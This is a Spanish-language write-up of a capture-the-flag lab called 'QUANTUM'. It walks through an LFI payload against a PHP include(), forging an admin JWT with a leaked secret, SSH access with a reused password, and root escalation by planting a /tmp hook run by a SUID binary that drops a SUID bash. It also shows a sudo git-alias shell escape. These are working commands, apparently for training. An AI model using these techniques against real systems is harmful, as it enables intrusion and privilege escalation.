# QUANTUM — Bitácora del análisis

**Objetivo:** `172.17.0.2` (contenedor Docker) — **Atacante:** Kali Linux (`172.17.0.1`)
**Hostname:** `quantum` — **Base:** Ubuntu 22.04.5 LTS (jammy)
**Dificultad:** difícil (★★★★★☆☆☆, 5 pts) — **Categoría:** SUID & Sudo
**Bandera:** `QUANTUM{qu4ntum_3nt4ngl3m3nt_c0mpl3t3d}` (validada: 2026-10-23 16:21:31 -0600)

> **Restricción del ejercicio:** el análisis se hizo por red. La única lectura directa del
> filesystem fue a través de la LFI y, después del compromiso, con una shell de root obtenida por
> el propio SUID. No se inspeccionó la configuración del contenedor desde el host.

---

## 1. Cronología

| Hora (local, -0600) | Acción | Resultado |
|---|---|---|
| 16:10 | `nmap -p-` y `nmap -sV -sC` | 22/SSH, 80/Apache, 5000/Werkzeug |
| 16:10–16:11 | `curl` y `gobuster` contra :80 y :5000 | :80 es la página por defecto; API lista `/auth`, `/user/<id>`, `/data`, `/admin` |
| 16:11 | Enumeración de `/user/<id>` | `researcher` (user), `aidev` (developer), `sysadmin` (admin) |
| 16:12 | Pruebas de credenciales y SQLi en `/auth` | Sin éxito; el login solo acepta JSON |
| 16:13 | `gobuster` con DirBuster medium | Aparece `/quantum/` y el listado `/quantum/pages/` |
| 16:13 | `?page=about|research|team` | Aplicación PHP real; `research.php` menciona la API Flask del :5000 |
| 16:13 | `?page=/etc/passwd` y `?page=php://filter/...` | LFI confirmada; lectura arbitraria como `www-data` |
| 16:14 | Lectura de `index.php` | `include($page)` directo si no existe `pages/$page.php` |
| 16:14 | Lectura de `/start.sh` y `/opt/api/app.py` | Ruta de la API, `SECRET_KEY` y contraseña de `researcher` en claro |
| 16:14 | `POST /auth` y forja de JWT | Token de usuario y token `admin` con el secreto filtrado; `/admin` accesible |
| 16:14 | SSH como `researcher` con la contraseña de la API | `uid=1000(researcher)`; contraseña reutilizada |
| 16:14 | `sudo -n -l` / `sudo -l` | Sin regla para `researcher`; no es el vector |
| 16:14 | Inventario SUID | `/usr/local/bin/backup` (root, setuid) fuera del conjunto estándar |
| 16:14 | `strings` del binario | Ejecuta `/tmp/.backup-hook` como root |
| 16:14 | Hook en `/tmp/.backup-hook` + `backup` | `uid=0(root)`; lectura de `/root/flag.txt` |
| 16:16 | Post-explotación del home de `aidev` | `.git` con un commit «Remove credentials»; el objeto anterior filtra `SYSADMIN_PASS` |
| 16:16 | SSH como `sysadmin` | Contraseña válida; sin regla sudo, pero mismo SUID `backup` |
| 16:16 | Lectura de `/etc/sudoers` | `aidev ALL=(sysadmin) NOPASSWD: /usr/bin/git`; vector lateral |
| 16:21 | Validación con `startlab.sh` | «¡Felicitaciones! Has conquistado QuantumAI.» |

> El contenedor se recrea al ejecutar el validador. Las evidencias quedaron en `shots/captures/`,
> `recon/` y `loot/` antes de la validación.

---

## 2. Reconocimiento

### 2.1 Puertos

```text
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp    open  http     Apache httpd 2.4.52 (Ubuntu)
5000/tcp  open  http     Werkzeug 3.1.6 / Python 3.10.12
```

De 65 535 puertos TCP solo tres están abiertos. El :80 devuelve la página por defecto de Apache;
el :5000 es una API Flask que se identifica como «QuantumAI API v1.0».

### 2.2 Puerto 80

`gobuster` con la lista común no encuentra nada; con DirBuster medium aparece:

```text
/quantum/         (301)  → /quantum/
/quantum/pages/   (301)  → listado de directorio
```

`/quantum/` es la aplicación real: un sitio PHP con `?page=about`, `?page=research` y `?page=team`.
`/quantum/pages/` tiene el listado habilitado y muestra `about.php`, `research.php` y `team.php`.
`research.php` incluye la pista «Internal API: Flask (port 5000)».

**Decisión:** la página por defecto del :80 es un señuelo; la superficie útil es `/quantum/` y la
API del :5000.

### 2.3 API :5000

```json
{"endpoints":["/auth","/user/<id>","/data","/admin"],"service":"QuantumAI API v1.0"}
```

- `GET /user/1..3` no requiere autenticación y filtra usuarios y roles (IDOR).
- `POST /auth` solo acepta `application/json` y devuelve un JWT.
- `GET /data` y `GET /admin` exigen `Authorization: Bearer <token>`.

Las credenciales obvias (`admin:admin`, `sysadmin:sysadmin`, etc.) y las inyecciones SQL en
`username`/`password` no funcionan. El login no da pistas de usuarios válidos.

---

## 3. LFI en `/quantum/?page=`

### 3.1 Código vulnerable

Leído con `php://filter` (el `include()` del `.php` no se ejecuta, se vuelca):

```php
if(isset($_GET['page'])) {
    $page = $_GET['page'];
    $file = "pages/" . $page . ".php";
    if(file_exists($file)) {
        include($file);
    } else {
        @include($page);
    }
}
```

La primera rama añade `.php`; si el fichero no existe, la segunda rama incluye **la ruta cruda**.
Eso permite `?page=/etc/passwd` y `?page=php://filter/convert.base64-encode/resource=...`.

### 3.2 Lecturas clave

| Ruta | Contenido |
|---|---|
| `/etc/passwd` | `researcher` (1000), `aidev` (1001), `sysadmin` (1002) |
| `/start.sh` | `python3 /opt/api/app.py`; arranque de Apache y SSH |
| `/opt/api/app.py` | `SECRET_KEY = "QuantumAPISecretKey2024_WEAK"` y `researcher:Quant0mR3s34rch` |
| `/etc/ssh/sshd_config` | `PasswordAuthentication yes`; sin restricción de usuarios |

**Decisión:** no hace falta convertir la LFI en RCE. El objetivo es leer el código de la API y
reutilizar la credencial en SSH.

---

## 4. API y JWT

- `POST /auth` con `researcher:Quant0mR3s34rch` devuelve un JWT HS256 con `role: user`.
- El `SECRET_KEY` está en el código y es débil (28 bytes; PyJWT emite un aviso de longitud).
- Con el secreto se forja un token `role: admin` para `sysadmin` (`user_id: 3`).
- `GET /admin` devuelve `admin_access`; `GET /data` devuelve el placeholder de investigación.

El impacto real de la API en este laboratorio es limitado (no hay más datos), pero demuestra que
cualquiera con acceso al código puede emitir tokens de administrador. La escalada real viene por la
contraseña reutilizada.

---

## 5. Acceso inicial y escalada

### 5.1 SSH como `researcher`

```bash
sshpass -p 'Quant0mR3s34rch' ssh researcher@172.17.0.2
```

`id` confirma `uid=1000(researcher)`. `sudo -n -l` pide contraseña; con la contraseña correcta,
`sudo` responde «Sorry, user researcher may not run sudo on quantum». `researcher` no está en
`/etc/sudoers` ni en el grupo `sudo`.

### 5.2 SUID `/usr/local/bin/backup`

```text
-rwsr-xr-x 1 root root 16296 /usr/local/bin/backup
setuid ELF 64-bit LSB pie executable, not stripped
```

`strings` revela:

```text
Usage: backup <directory>
tar czf /tmp/backup_%ld.tar.gz %s 2>/dev/null
/tmp/.backup-hook
/bin/bash /tmp/.backup-hook
Backup completed: /tmp/backup_%ld.tar.gz
```

El binario corre con `euid=0`, ejecuta `tar` sobre el directorio indicado y, si existe
`/tmp/.backup-hook` ejecutable, lanza `/bin/bash /tmp/.backup-hook`. Como `/tmp` es world-writable,
cualquier usuario local puede plantar el hook.

### 5.3 Hook y root

```bash
cat > /tmp/.backup-hook <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
id > /tmp/root-id.txt
cat /root/flag.txt > /tmp/flag.txt
EOF
chmod +x /tmp/.backup-hook
/usr/local/bin/backup /home/researcher
cat /tmp/root-id.txt
/tmp/rootbash -p -c 'id; cat /root/flag.txt'
```

Resultado: `uid=0(root)` en el hook y `euid=0(root)` en la shell SUID; bandera leída.

---

## 6. Hallazgos post-explotación

### 6.1 Secretos en el historial de Git

El home de `aidev` contiene un repositorio en `/home/aidev/project`. El commit actual sustituye
`.env` por `API_KEY=<REMOVED>`, pero el commit anterior («Initial setup») conserva el blob original:

```text
API_KEY=QAI_dev_2024
SYSADMIN_PASS=SysAdm1n@Q
```

`SysAdm1n@Q` es válida para SSH como `sysadmin` (verificado). `sysadmin` no tiene regla sudo, pero
puede ejecutar el mismo SUID `backup` para llegar a root. `QAI_dev_2024` no funcionó como contraseña
SSH de `aidev`.

### 6.2 Regla sudo de `aidev`

`/etc/sudoers` contiene:

```sudoers
aidev ALL=(sysadmin) NOPASSWD: /usr/bin/git
```

Si se compromete `aidev`, la regla permite ejecutar `git` como `sysadmin`; un alias de Git puede
lanzar comandos de shell:

```bash
sudo -n -u sysadmin /usr/bin/git -c alias.pwn='!id' pwn
# uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin)
```

No se obtuvo la contraseña de `aidev`, así que la regla se validó con root suplantando a `aidev`
(`setpriv`). Es un vector lateral real, no la ruta crítica.

---

## 7. Validación

```bash
printf 'QUANTUM{qu4ntum_3nt4ngl3m3nt_c0mpl3t3d}\n' | bash startlab.sh quantum.tar
```

Salida relevante:

```text
LAB: QUANTUM
DIFICULTAD: ★★★★★☆☆☆ dificil (5 puntos)
IP del laboratorio: 172.17.0.2

Ingresa la flag (formato QUANTUM{...}):
¡Felicitaciones! Has conquistado QuantumAI.

FECHA Y HORA: 2026-10-23 16:21:31 -0600
```

La captura real del terminal, conservada en `docs/img/12-validacion-real.png`, está fechada a las
**16:22:59 -0600** y muestra la misma bandera y el mismo resultado. El validador recrea el contenedor;
las evidencias se conservan en local.
